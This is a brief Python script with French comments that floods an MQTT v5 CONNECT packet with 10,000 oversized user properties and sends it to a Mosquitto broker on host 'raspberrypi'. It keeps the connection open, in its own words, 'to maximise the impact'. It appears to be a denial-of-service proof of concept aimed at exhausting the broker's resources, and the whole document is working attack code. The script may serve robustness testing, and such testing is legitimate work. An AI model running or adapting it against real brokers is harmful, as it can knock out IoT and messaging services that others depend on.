from paho.mqtt import client as mqtt
import time

# Configuration du client MQTT
client = mqtt.Client(
    callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
    protocol=mqtt.MQTTv5
)

# Création des propriétés utilisateur pour le paquet CONNECT
properties = mqtt.Properties(mqtt.PacketTypes.CONNECT)
for _ in range(10000):  # Ajouter 10000 propriétés utilisateur
    properties.UserProperty = ('key', 'A' * 50)

# Connexion au broker Mosquitto
client.connect("raspberrypi", 1883, properties=properties)

# Maintenir la connexion ouverte pour maximiser l'impact
time.sleep(10)
